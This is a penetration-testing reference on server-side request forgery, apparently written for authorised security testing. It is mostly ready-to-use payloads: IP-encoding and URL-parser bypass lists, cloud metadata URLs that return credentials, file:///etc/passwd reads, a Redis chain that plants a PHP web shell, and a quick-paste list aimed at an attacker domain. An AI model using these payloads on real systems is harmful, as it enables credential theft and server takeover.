# Server-Side Request Forgery (SSRF)

## 1. Where to Look

Any feature that makes the server fetch a URL or connect to a remote host:
```
Webhooks (enter a URL, server POSTs to it)
URL preview / link unfurling
File import from URL (import CSV/PDF from URL)
Avatar/image upload by URL
PDF generation from URL (wkhtmltopdf, headless Chrome)
Document conversion (Word -> PDF, HTML -> PDF)
"Test connection" for database/SMTP/FTP
SVG processing (SVG can reference external resources)
RSS/Atom feed processing
API integrations (add Slack, add GitHub - enter webhook URL)
OAuth redirect_uri (if server-side validated by fetching it)
XML processing (XXE -> SSRF)
Image processing (ImageMagick fetches URLs in policies)
Proxy/gateway features
```
In an API-specific context: any request body field that's a URL rather than a literal value
(`webhook_url`, `avatar_url`, `import_url`, `callback`) is this same primitive - see
`reference/rest-api.md` section 12 and `reference/graphql.md` section 6 for the API-shaped versions, and
`custom-labs/api-custom-lab`'s unsafe-consumption section for a worked example where the
URL itself is sourced from a "trusted" upstream API response rather than direct user input.

## 2. Basic Detection

```bash
interactsh-client -v &   # generates a callback domain, e.g. abcdef.oast.fun

curl -X POST https://target.com/api/webhook -H "Content-Type: application/json" \
  -d '{"url":"http://abcdef.oast.fun/ssrf-test"}'
# check interactsh for incoming DNS/HTTP
```

## 3. Bypass Techniques

**Mental model - three bypass goals, pick the right tool for which one applies:**
1. **Localhost/blocklist bypass** - make a restricted host (127.0.0.1/localhost/internal
   range) pass a block check -> alternative IP representations (3.1), scheme confusion (3.2/3.6).
2. **Allowlist bypass** - make `attacker.com` pass an `example.com`-must-match check -> URL
   parser confusion (3.5): prefix/suffix/contains string matching vs. actual host resolution
   disagree.
3. **Validator-vs-fetcher decode mismatch** - the check and the actual outbound request parse
   the same string differently at different pipeline stages (3.8, distinct from simple
   double-encoding).

### 3.1 IP Address Representations

```
http://2130706433/          -> 127.0.0.1 (decimal)
http://0x7f000001/          -> 127.0.0.1 (hex)
http://0177.0.0.1/          -> 127.0.0.1 (octal)
http://127.1/               -> 127.0.0.1 (short notation)
http://127.000.000.001/     -> 127.0.0.1 (zero-padded)
http://0/                   -> 0.0.0.0 = 127.0.0.1 on many systems

http://[::1]/                -> 127.0.0.1
http://[::ffff:127.0.0.1]/   -> IPv4-mapped
http://[::ffff:7f00:1]/      -> 127.0.0.1 in hex

http://localhost/
http://localtest.me/         -> resolves to 127.0.0.1 in public DNS
http://127.0.0.1.nip.io/     -> resolves to 127.0.0.1

# Unicode digit substitution (a blocklist regex expecting ASCII digits only)
1㉗.0.0.1                     # some parsers normalize circled/CJK digit chars before resolving

# Backslash-escaped hostname (Windows-targeting parsers)
\l\o\c\a\l\h\o\s\t

# Unicode ligature substitution - doesn't literally contain "localhost" but normalizes to it
# (NFKC) before resolution, evading a literal-string blocklist:
localhoﬆ                     # ﬆ is the "st" ligature
```

### 3.2 URL Scheme Variations

```
file:///etc/passwd
dict://127.0.0.1:6379/info    # Redis info
gopher://127.0.0.1:6379/...   # raw TCP (Redis, Memcached, SMTP)
ftp://127.0.0.1/
ldap://127.0.0.1:389/
smtp://127.0.0.1:25/
```

### 3.3 DNS Rebinding

```
1. Register attacker.com -> first DNS resolution: ALLOWED_IP (e.g. 1.2.3.4)
2. Server fetches attacker.com -> resolves to 1.2.3.4 -> passes allow-list check
3. Server follows a redirect or makes a second request -> DNS re-resolves -> returns 127.0.0.1
4. Second request hits the internal service
```
Services: `rbndr.us` (`1-2-3-4.7f000001.rbndr.us` alternates between the two IPs), or the
`singularity` tool for automated DNS rebinding.

### 3.4 Open Redirect Chain

```
# If the app only checks the initial domain via allowlist:
https://target.com/redirect?url=http://169.254.169.254/
# Or a 30x redirect at an allowed domain, to internal:
https://allowed-domain.com/redirect -> http://169.254.169.254/
```

### 3.5 URL Parser Confusion (Allow/Blocklist Bypass)

```
# @ in URL - everything before @ is username, after is host
http://attacker.com@127.0.0.1/
http://127.0.0.1@attacker.com/

# # fragment - some parsers stop at #
http://127.0.0.1#.attacker.com

# Subdomain bypass
http://127.0.0.1.attacker.com/   # attacker.com as an "allowed" prefix
http://attacker.com.127.0.0.1/   # or suffix trick

# Percent-encode the entire host
http://%31%32%37%2e%30%2e%30%2e%31/   # 127.0.0.1

# Unicode/IDN hostname
http://127。0。0。1/   # unicode dots that normalize to 127.0.0.1
```

### 3.6 Protocol-Based Bypass

```bash
https://127.0.0.1/
http:/127.0.0.1/      # single slash
http:127.0.0.1/       # no slashes - some parsers accept
htTp://127.0.0.1/     # case variation
```

### 3.7 IPv4-Only Validation vs. IPv6-Capable Fetcher

If the SSRF blocklist resolves a hostname via an IPv4-only call and the target hostname has
only an AAAA (IPv6) record, the resolution call can return the hostname unchanged instead of
an IP - silently passing the blocklist (nothing to compare against). The actual outbound HTTP
client then resolves normally and connects over IPv6, including to `[::1]`. Test a hostname
with only an AAAA record pointing at loopback/internal, or directly try IPv6 loopback/link-local
forms (`http://[::1]/`, `http://[::ffff:127.0.0.1]/`) against any blocklist that looks
IPv4-focused.

**Variant:** a character blocklist meant to restrict input format entirely misses `[`, `:`,
`]`. If an app builds an internal hostname from a route parameter expected to be a simple label
and only blocklists obvious SSRF metacharacters, swap in a bracketed IPv6-mapped-IPv4 literal
for the intended label - the app's own parser extracts it as the IPv6 literal, the resolver
maps it to the mapped IPv4 address, and if that address is in the allowlist (even for a
different internal service than the route was designed to reach), the check passes.

### 3.8 Validation-Order Bugs (Allow-List Checked Before Decode)

Distinct from double-encoding: the validator and the actual fetch client are simply two
different parsers running at two different pipeline stages, and only one decodes the path
before acting. An allow-list check (e.g. `url.startsWith("http://internal.example.com/refs/")`)
runs against the raw, still-percent-encoded string - it never sees `..` because the traversal
is encoded as `%2e%2e`, so the check passes. A later stage (the actual HTTP client) decodes the
URL as normal, `%2e%2e` becomes `..`, and the request resolves outside the intended prefix:
```
http://internal.example.com/refs/%2e%2e/admin/internal-endpoint
http://internal.example.com/refs/1/%2e%2e/%2e%2e/internal/registry
```
Spot it whenever an allow-list checks a *prefix or path-segment structure* rather than the
fully-resolved final path.

### 3.9 Validator-Type-to-Bypass Quick Reference

| Validator checks | Best bypass class |
|---|---|
| `startsWith("https://example.com")` | Subdomain: `example.com.attacker.com`, or `example.com@attacker.com` |
| `endsWith("example.com")` | Prefix: `attacker.com.example.com`, or `attackerexample.com` |
| `includes("example.com")` | Either prefix or suffix form above |
| Blocklist of `127.0.0.1`/`localhost` | Integer/hex/octal/IPv6 representations (3.1), unicode substitution |
| Prefix/path-segment allow-list (not just host) | Validation-order bug (3.8) |

### 3.10 Port-Range / Adjacent-Port Allowlist Bypass

A common mitigation is "only allow requests to `localhost` on the port our internal service
actually listens on." Some implementations validate this as a *range* rather than an exact
match. Once one internal port is confirmed reachable, sweep adjacent ports before concluding
the allowlist is a single-port match:
```bash
for p in 3999 4001 4002 3998; do
  curl -s -X POST https://target/api/vulnerable-endpoint -H "Content-Type: application/json" \
    -d "{\"url\":\"http://localhost:$p/\"}"
done
```
A response that flips from rejected on one adjacent port to a normal `200` on another means
the block is scoped to a *range*, and the boundary is the bug. Treat any newly-reached service
as unauthenticated by default - internal services in this position frequently skip auth
entirely on the assumption only the app's own backend can ever reach that port.

## 4. Cloud Metadata Endpoints

```
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
# IMDSv2 requires a token first - try anyway, some services don't enforce it:
# PUT http://169.254.169.254/latest/api/token, header X-aws-ec2-metadata-token-ttl-seconds: 21600

# GCP (requires header Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (requires header Metadata: true)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

## 5. Gopher Protocol - Internal Service Exploitation

Gopher sends arbitrary bytes to any TCP port - useful against internal services with no auth:
```
# Redis SET via gopher (generate with Gopherus: python gopherus.py --exploit redis)
gopher://127.0.0.1:6379/_%2A2%0D%0A%244%0D%0ASET%0D%0A...
```

## 6. SSRF to RCE Escalation Paths

- **Redis**: `SSRF -> redis://127.0.0.1:6379` -> `CONFIG SET dir /var/www/html`,
  `CONFIG SET dbfilename shell.php`, `SET 1 "<?php system($_GET['cmd'])?>"`, `BGSAVE`.
- **Internal Kubernetes API**: `http://10.0.0.1:8080/api/v1/namespaces/default/pods`.
- **Internal Elasticsearch**: `http://127.0.0.1:9200/_cat/indices`.
- **"Connect to hub"/response-trust SSRF-to-RCE**: some admin/setup APIs (`connect-to-hub`,
  "register node", "sync remote", "import from URL") take an attacker-controlled target
  address, fetch it, then deserialize the response and act on fields from it - e.g. a field
  reaching a `RunCommand`-style sink. Stand up a listener returning a crafted JSON body naming
  a command/config, point the "connect"/"sync" endpoint at it. This is exactly the shape
  `custom-labs/api-custom-lab`'s unsafe-consumption section teaches, minus the RCE payload.
- **SSRF to an internal auth/signing microservice**: any server-side URL-fetch proxy is worth
  probing for an internal `/auth`/`/internal` sub-service specifically. If it leaks a private
  signing key and the app uses RS256 JWTs, that's a silent, complete authentication bypass -
  forge any identity with the leaked key, no signature-verification bug needed at all (distinct
  from alg-confusion/`kid` injection - see `reference/jwt-attacks.md`).

## 7. Blind SSRF

No response body returned - use a callback (`interactsh-client`), detect via DNS lookup, HTTP
GET, or timing (internal request timing out vs. a fast internal response). When even the
callback path is blocked, a redirect chain hosted on attacker infrastructure can turn blind
SSRF visible - the vulnerable server following each hop back to attacker infra IS the signal,
even when the internal target itself never returns anything.

## 8. PDF/HTML-to-PDF SSRF (wkhtmltopdf)

```html
<iframe src="file:///etc/passwd"></iframe>
<script>x=new XMLHttpRequest;x.open('GET','file:///etc/passwd',false);x.send();document.write(x.response)</script>
```

## 9. SSRF via SVG Upload/Processing

SVG is XML-based and can embed a request to an external resource directly in markup - any
feature that accepts SVG and server-side renders it (thumbnail generation, rasterization) is
worth testing even when the feature looks purely cosmetic:
```xml
<svg width="300" height="300" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="200" height="200"/>
</svg>
```
Some SVG-rendering pipelines separately have their own XXE vulnerability in the XML parser
underneath the SVG parser - even if remote-URL loading looks disabled for the "normal" path,
test the raw XXE angle too (see `reference/soap-wsdl.md`'s XXE section for the technique,
applied here to SVG instead of a SOAP body).

## 10. Operational Quick-Paste Set (Top 20 for Intruder/ffuf)

```
https://web-attacker.com/
//web-attacker.com
http:/\web-attacker.com
https://0x7f000001/
https://2130706433/
https://[::1]/
https://[::ffff:127.0.0.1]/
%01http://web-attacker.com
%00http://web-attacker.com
https://%09web-attacker.com/
%0D%0A//web-attacker.com
https://example.com%40web-attacker.com/
https://web-attacker.com%40example.com/
https://example.com.web-attacker.com/
https://web-attacker.com.example.com/
https://example.comweb-attacker.com/
https://example.com#web-attacker.com/
https://%C2%ADlocalhost/
https://web-attacker.com%00example.com/
null
```
Replace `web-attacker.com` with your interactsh/Collaborator domain. Use this as a first sweep
before falling back to the full technique-by-technique sections above for anything that
resists it.

## Checklist

- [ ] All URL-accepting features identified (including URLs sourced from a trusted upstream
      integration's response, not just direct request parameters)
- [ ] Basic SSRF with an OOB callback confirmed
- [ ] Internal IP ranges probed: 127.0.0.1, 10.x, 172.16.x, 192.168.x
- [ ] Cloud metadata endpoints probed (AWS/GCP/Azure)
- [ ] IP bypass formats tried: decimal, hex, octal, IPv6, short notation
- [ ] DNS rebinding attempted if direct bypass is blocked
- [ ] Open redirect chain tried to bypass a URL allowlist
- [ ] URL parser confusion tried (`@` trick, `#` trick)
- [ ] Validator type identified (startsWith/endsWith/includes) and the matching bypass class applied
- [ ] Adjacent ports swept once one internal port is confirmed reachable
- [ ] Any "connect to hub/node", "sync from URL", "register agent" endpoint tested for response-trust SSRF-to-RCE
- [ ] Any SSRF-capable proxy probed for an internal `/auth` sub-service leaking a signing key
- [ ] Any SVG upload/render feature tested with an `xlink:href` pointing at an internal target
- [ ] Blind SSRF confirmed via DNS/HTTP callback if no direct response
- [ ] Full quick-paste set (section 10) swept via Intruder/ffuf if targeted techniques fail
